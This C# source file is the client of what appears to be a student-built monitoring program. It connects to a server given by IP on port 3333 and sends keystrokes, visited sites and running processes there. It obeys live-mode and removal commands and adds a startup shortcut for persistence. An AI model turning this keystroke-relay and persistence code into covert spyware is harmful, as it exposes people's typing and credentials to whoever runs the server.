﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace ClientSide
{

    public delegate void wordFromKeylogger(string word);
    public delegate void SiteFromMonitorSite(string word);
    public delegate void updateProccess(string proccess);
    class Program
    {

        const string ID = "id";
        const string SETTING = "setting";
        const string LIVE = "start live mode";
        const string STOP_LIVE = "stop current state";
        const string REMOVE_CLIENT = "remove client";
        const string LAST_REPORT = "send last report";

        private String id;
        private Socket clientSocket;
        private String name;
        private String ip;
        private Byte[] buffer;
        private DBclient dbc;
        private Setting set;
        private ClientForm clientForm;
        public Boolean sendCurrentData;
        string keyDate;
        public static Program program;
        ManageMonitor manageMonitor;
        private static bool checkConnection;



        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // sqliteForm sf = new sqliteForm();
            // sf.ShowDialog();

            

            program = new Program();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);


            // check if connect at first time or reconnect         
            if (!program.connectToExistClient())
            {
                program.connectToServer();
            }
            Thread interntAvilable = new Thread(checkInterntConnection);
            interntAvilable.Start();
            Application.Run();
        }

        public static void checkInterntConnection()
        {
            checkConnection = true; 
            while (checkConnection)
            {
                Thread.Sleep(5000);
                try
                {
                    using (var client = new WebClient())
                    using (var stream = client.OpenRead("http://www.google.com"))
                    {
                        // try send data to server
                        try {
                            //   program.SendData(program.clientSocket, "check connection");
                            
                        }
                        catch (SocketException ex) {
                            break;
                        }

                    }

                }
                catch
                {
                    //           program.reConnect();

                }


            }

        }


        private static void connectAtReStartComputer()
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            WshShell shell = new WshShell();
            string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "A startup shortcut. If you delete this shortcut from your computer, LaunchOnStartup.exe will not launch on Windows Startup"; // set the description of the shortcut
            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
            shortcut.Save(); // save the shortcut 
            shortcut.Arguments = "/a /c";


            // if (rkApp.GetValue("ClientSide.exe") == null) { }
            // Remove the value from the registry so that the application doesn't start
            //  else 
            //  rkApp.DeleteValue("ClientSide.exe", false);

        }



        // The function is activated as soon as data is received in the socket
        private void ReceiveCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                int received = clientSocket.EndReceive(AR);
                if (received == 0)
                {
                    return;
                }

                string data = Encoding.ASCII.GetString(buffer);

                var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);

                DBclient DBInstance = DBclient.Instance;

                switch (dataFromServer[0])
                {
                    // Get uniqe id 
                    case ID:
                        id = dataFromServer[1].Split('\r', '\n', '\0')[0];
                        DBInstance.fillGeneralDetailsTable("id", id);
                        //ShowErrorDialog("get id"); 
                        break;

                    // Get Setting to implement monitoring
                    case SETTING:
                        string setting = dataFromServer[1].Split('\0')[0];
                        setting = setting.Substring(setting.IndexOf("\n") + 1);
                        // save setting 
                        saveSettingFile(setting);
                        playAllTrigers(); //This method obtains the settings string from the server
                        break;

                    // Launch the software in live reporting mode
                    case LIVE:
                        liveMode(clientSocket);// sara 
                        break;

                    // Stop live reporting mode
                    case STOP_LIVE:
                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                        stopLiveMode(clientSocket);
                        break;

                    // Stop live reporting mode
                    case LAST_REPORT:
                        sendLastReport(clientSocket);
                        break;

                    // Remove computer from monitoring
                    case REMOVE_CLIENT:
                        removeClient();
                        break;

                    default:
                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                        break;
                }

                buffer = new byte[clientSocket.ReceiveBufferSize];
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
            }

            catch (SocketException ex)
            {
                ShowErrorDialog("ReceiveCallback - RECONNECT \n" + ex.Message);
                reConnect();
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ReceiveCallback " + ex.Message);
            }
        }

        private void sendLastReport(Socket socket)
        {

            string lastReport = Report.getReportString();
            if (lastReport == null)
            {
                SendData(socket, "last report\r" + "NO REPORT TO SHOW");
            }
            ShowErrorDialog("last reort is: " + lastReport);
            SendData(socket, "sara ayash\r");
            SendData(socket, "last report\r" + lastReport);
        }

        private void removeClient()
        { 
            ShowErrorDialog("removeeeeeeeeeeee");
            
            // turn off all theards 
            manageMonitor.stopAllTriggers();
           
            // create last report
            Report.createLastReport();
           
            // db
            DBclient DBInstance = DBclient.Instance;
            DBInstance.deleteDB();
                     
            // restart - delete key 
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.DeleteValue("ClientSide.exe", false);

            // stop theard checkConnection
            checkConnection = false;





        }


        private void stopLiveMode(Socket clientSocket)
        {

            sendCurrentData = false;
            //  monitorProccess.ifLive = false;
            //ShowErrorDialog("stop send current state");
            manageMonitor.stopLiveMode();
        }

        private void liveMode(Socket socket)
        {
            sendCurrentData = true;
            SendData(socket, "open live form\r");
            SendData(socket, "current state\ropen CurrentState form");
            manageMonitor.playLiveMode();


        }

        // set setting and here will play all triggers;
        private void playAllTrigers()
        {

            //ShowErrorDialog("play all trigers");

            // Play all monitors
            manageMonitor = new ManageMonitor();
            manageMonitor.playAllTriggers();

            // Set Report
            Report.setReportFrequency();
        }

        private void saveSettingFile(string setting)
        {
            string userName = Environment.UserName;


            String projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;


            String[] paths = new string[] { @filepath, "files" };
            filepath = Path.Combine(paths);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            String settingFile = Path.Combine(filepath, "setting_" + userName + ".txt");
            if (System.IO.File.Exists(settingFile))
            {
                System.IO.File.Delete(settingFile);

            }
            using (StreamWriter sw = System.IO.File.CreateText(settingFile)) ;
            System.IO.File.WriteAllText(settingFile, name + "\r\n" + id + "\r\n" + setting);


            // play Reporting scheduling
            Report.setReportFrequency();
        }

        // Defines functions for sending and receiving data through the socket
        private void ConnectCallback(IAsyncResult AR)
        {

            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndConnect(AR);
                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);

                // ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);
                if (id != null)
                    SendData(clientSocket, "id\r" + id);
                else SendData(clientSocket, "name\r" + name);

            }
            catch (SocketException ex)
            {
                ShowErrorDialog("ConnectCallback send SocketException\r\n" + ex.Message);

                reConnect();

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("ConnectCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        // A method that sends information to a server
        private void SendCallback(IAsyncResult AR)
        {
            try
            {
                clientSocket = AR.AsyncState as Socket;
                clientSocket.EndSend(AR);
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("SendCallback send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendCallback send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }


        public void connectToServer()
        {
            try
            {

                clientForm = new ClientForm();
                clientForm.Text = "Connecting to monitoring software";
                Thread openClientForm = new Thread(openClientFormDialog);
                openClientForm.SetApartmentState(ApartmentState.STA);
                openClientForm.Start();

                while (openClientForm.IsAlive) ;

                name = clientForm.clientName;
                ip = clientForm.ip;
                DBclient DBInstance = DBclient.Instance;
                DBInstance.fillGeneralDetailsTable("name", name);
                DBInstance.fillGeneralDetailsTable("ip", ip);

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
                
                // Set up the software that will work when you turn on the computer           
                connectAtReStartComputer();
            }
            catch (SocketException ex)
            {
                ShowErrorDialog("connectToServer send SocketException\r\n" + ex.Message);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("connectToServer send ObjectDisposedException\r\n" + ex.Message);
            }


        }

        public static bool CheckConnection(Socket clientSocket)
        {

            if (internetConnection() && SocketConnected(clientSocket))
                return true;
            else
                return false;
        }

        public static bool SocketConnected(Socket s)
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);

            if (part1)
                return false;
            else
                return true;
        }

        public static bool internetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private bool connectToExistClient()
        {

            string set = "";
            string projectDirectory = Environment.CurrentDirectory;
            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
            string[] paths = new string[] { @filepath, "files" };
            filepath = Path.Combine(paths);

            DirectoryInfo directory = new DirectoryInfo(filepath);//Assuming Test is your Folder
            //ShowErrorDialog("filepath is: \n" + filepath);
            string fileName = "setting_" + Environment.UserName + ".txt";
            if (Directory.Exists(filepath) && System.IO.File.Exists(Path.Combine(filepath, fileName)))
            {

                using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, fileName)))
                {
                    name = sr.ReadLine();
                    id = sr.ReadLine();
                    //ip = "10.0.0.4";
                    //ip = "127.0.0.1";

                    DBclient DBInstance = DBclient.Instance;
                    ip = DBInstance.getGeneralDetailsTable("ip");
                    ShowErrorDialog("ipppp: " + ip);
                    string line = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        //ShowErrorDialog("line\n" + line);
                        set += line + "\r\n";
                    }
                }
                reConnect();
                playAllTrigers();

                return true;
            }


            return false;

        }

        private void openClientFormDialog()
        {
            clientForm.ShowDialog();
        }

        public void SendData(Socket clientSocket, String data)
        {
            
 
            try
            {
                if (CheckConnection(clientSocket))
                {
                    string crypto = Crypto.Encrypt(data);
                    string decrypto = Crypto.Decrypt(crypto);
                    //ShowErrorDialog("Send: "+ crypto);
                    var sendData = Encoding.UTF8.GetBytes(crypto);
                    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);

                   

                }
                else {
                    //reConnect();
                    SendData(clientSocket, data);
                }

            }
            catch (SocketException ex)
            {
                if (!CheckConnection(clientSocket))
                {
                    ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                    //reConnect();
                    SendData(clientSocket, data);

                }


                //SendData(clientSocket, data);
            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("SendData send ObjectDisposedException \r\n" + ex.Message);
                reConnect();
            }
        }
         

        //public void sendDataByParts(Socket clientSocket, string data)
        //{
        //    string subject = data.Split(new[] { '\r'}, 2)[0];
        //    string testData = data.Split(new[] { '\r' }, 2).Last();
        //    var sendData = Encoding.UTF8.GetBytes("start send data by parts\r" + subject + "\r");
        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);


        //    string subData = "";
        //    string subEncrypt = "";
        //    int index = 0;
        //    int length = 20;

        //    bool lastPart = false;
        //    while (!lastPart)
        //    {

        //        if ((index + length) > testData.Length)
        //        {
        //            length = testData.Length;
        //            subData += testData.Substring(index, length);
        //            lastPart = true;
        //        }
        //        else
        //        {
        //            subData += testData.Substring(index, index + length);
        //        }


        //        Byte[] subStringByte = Encoding.UTF8.GetBytes(testData);

        //        subEncrypt = Crypto.Encryption(subData);
        //        if (subEncrypt != string.Empty)
        //        {
        //            DBclient DBInstance = DBclient.Instance;
        //            string id = DBInstance.getGeneralDetailsTable("id");

        //            sendData = Encoding.UTF8.GetBytes("sub encrypt data\r" + id + "\r" + subEncrypt);
        //            clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
        //            index += length;
        //            length += 20;
        //        }



        //    }


        //    sendData = Encoding.UTF8.GetBytes("stop send data by parts\r" + id + "\r");
        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);


        //}



        public void reConnect()
        {
            try
            {

                // Create new socket 
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                buffer = new byte[clientSocket.ReceiveBufferSize];

                //ShowErrorDialog("reConnect in socket: " + clientSocket.RemoteEndPoint);
                // Connect To Server 
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                // The function ConnectCallback set callback to receive and send 
                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
                DBclient DBInstance = DBclient.Instance;
                string immadiateAlerts = DBInstance.getReportImmediateTable();
                if (immadiateAlerts.Length > 0) {
                    Report.sendImadiateAlertsToMail(immadiateAlerts);
                }

            }
            catch (SocketException ex)
            {
                ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message);

            }
            catch (ObjectDisposedException ex)
            {
                ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
            }
        }

        public static void updateCurrentKeylogger(string word)
        {

            //ShowErrorDialog(word);
            program.SendData(program.clientSocket, "current state\rkeyBoard\r" + word);


        }

        public static void updateCurrentSite(string site)
        {
            // ShowErrorDialog("send site: \n"+site);
            //Console.WriteLine(site); 
            program.SendData(program.clientSocket, "current state\rsite\r" + site);



        }

        public static void updateCurrentProcess(string proccess)
        {
            // ShowErrorDialog("send proc: \n" + proccess);
            program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);



        }


    }
}

